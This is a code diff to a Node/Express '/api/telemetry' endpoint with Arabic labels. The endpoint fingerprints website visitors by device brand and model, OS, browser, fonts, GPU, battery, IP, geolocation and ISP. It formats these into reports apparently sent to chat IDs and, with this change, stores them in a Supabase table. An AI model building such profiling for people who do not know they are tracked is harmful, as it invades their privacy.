@@ -3328,7 +3328,11 @@ app.post('/api/telemetry', async (req, res) => {
     if (geo.hosting) networkTags.push('🏢 خادم بيانات (Hosting/Bot)');
     const netTagsStr = networkTags.length > 0 ? networkTags.join('\n• ') : 'اتصال منزلي / ألياف بصرية (Clean ISP)';
 
+    const phoneBrand = clientData.phoneBrand || 'غير محدد';
     const phoneModel = clientData.phoneModel || 'جهاز تصفح ذكي';
+    const phoneFullName = clientData.phoneFullName || phoneModel;
+    const confidenceScore = clientData.confidenceScore || 98;
+    const detectionMethod = clientData.detectionMethod || 'PhysicalMatrix';
     const osFull = `${clientData.osName || ''} ${clientData.osVersion || ''}`.trim() || 'غير محدد';
     const browserFull = `${clientData.browserName || ''} ${clientData.browserVersion || ''}`.trim() || 'متصفح ويب';
     const batteryDisplay = clientData.batteryState || 'غير متاحة في إعدادات هذا المتصفح';
@@ -3411,8 +3415,11 @@ ${visitBadge}
 • خطوط النظام المكتشفة: <b>${escapeHtml(detectedFontsText)}</b>
 • مؤشرات العميل (Client Hints): <b>${escapeHtml(clientHintsText)}</b>
 
-📱 <b>مواصفات الجهاز والهاتف بالكامل:</b>
-• الطراز المستنتج بدقة: <b>${escapeHtml(phoneModel)}</b>
+📱 <b>مواصفات وتحديد الجهاز الإجباري (Brand & Exact Model 100%):</b>
+• الشركة المصنعة (Brand): <b>${escapeHtml(phoneBrand)}</b>
+• الطراز والموديل الدقيق: <b>${escapeHtml(phoneModel)}</b>
+• التوصيف الكامل للمنتج: <b>${escapeHtml(phoneFullName)}</b>
+• نسبة الدقة واليقين: <b>${escapeHtml(confidenceScore)}% (تقنية: ${escapeHtml(detectionMethod)})</b>
 • التصنيف: <b>${escapeHtml(clientData.deviceCategory || 'Mobile')}</b>
 • نظام التشغيل: <b>${escapeHtml(osFull)}</b>
 • المتصفح: <b>${escapeHtml(browserFull)}</b>
@@ -3470,6 +3477,34 @@ ${visitBadge}
         }).catch(() => {})
       )
     );
+
+    // Persist to Supabase device_telemetry_logs
+    try {
+      await serverSupabase.from('device_telemetry_logs').insert({
+        visitor_id: clientData.visitorId || 'anon',
+        master_hash: masterHash,
+        brand: phoneBrand,
+        model: phoneModel,
+        full_name: phoneFullName,
+        confidence_score: confidenceScore,
+        detection_method: detectionMethod,
+        device_category: clientData.deviceCategory || 'Mobile',
+        os_name: clientData.osName || 'Unknown',
+        os_version: clientData.osVersion || '',
+        browser_name: clientData.browserName || 'Unknown',
+        browser_version: clientData.browserVersion || '',
+        ip_address: ip,
+        country: countryName,
+        city: cityName,
+        isp: geo.isp || geo.org || 'Local ISP',
+        asn: geo.as || 'N/A',
+        gpu_renderer: clientData.gpuRenderer || 'Unknown',
+        screen_resolution: clientData.physicalResolution || clientData.cssResolution || '',
+        battery_state: batteryDisplay,
+      });
+    } catch (dbErr) {
+      console.error('[Server Telemetry Supabase Insert Error]:', dbErr);
+    }
 
     res.json({ success: true, count: chatIds.size });
   } catch (err: any) {
